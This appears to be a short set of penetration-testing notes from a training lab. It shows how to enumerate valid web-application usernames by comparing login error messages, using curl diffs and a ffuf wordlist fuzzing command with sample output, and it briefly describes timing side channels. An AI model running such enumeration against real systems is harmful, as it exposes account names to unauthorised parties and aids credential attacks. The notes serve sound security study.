### Content

- [Usernames](#usernames)
	- [Enumerating Users via Differing Error Messages](#enumerating-users-via-differing-error-messages)
	- [Enumerating Users via Side-Channel Attacks](#enumerating-users-via-side-channel-attacks)

---
### Usernames

Usernames can be considered confidential if they are the primary identifier required for authentication in web applications.

#### Enumerating Users via Differing Error Messages

```bash
$ diff <(curl http://<IP> -s) <(curl http://<IP> -s --data "username=name&password=pass")
28a29,35
>                   <div class="col s12">
>             <div class="alert card red lighten-4 red-text text-darken-4">
>                 <div class="card-content">
>                   <p><i class="material-icons">report</i> Unknown user.</p>
>                 </div>
>               </div>
>           </div>

$ ffuf -u 'http://IP:PORT' -d 'username=FUZZ&password=pass' -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -fr 'Unknown user.'
ExistedName                [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 612ms]

# After finding the correct user name
$ diff <(curl http://154.57.164.66:32311 -s) <(curl http://154.57.164.66:32311 -s --data "username=ExistedName&password=pass")                                                                           28a29,35
>                   <div class="col s12">
>             <div class="alert card red lighten-4 red-text text-darken-4">
>                 <div class="card-content">
>                   <p><i class="material-icons">report</i> Invalid credentials.</p>
>                 </div>
>               </div>
>           </div>
```

#### Enumerating Users via Side-Channel Attacks

Side-channel attacks do not directly target the web application's response, it targets information that can be obtained or inferred from it. An example of a side channel is the response timing. (because the time the application takes to look in the DB)
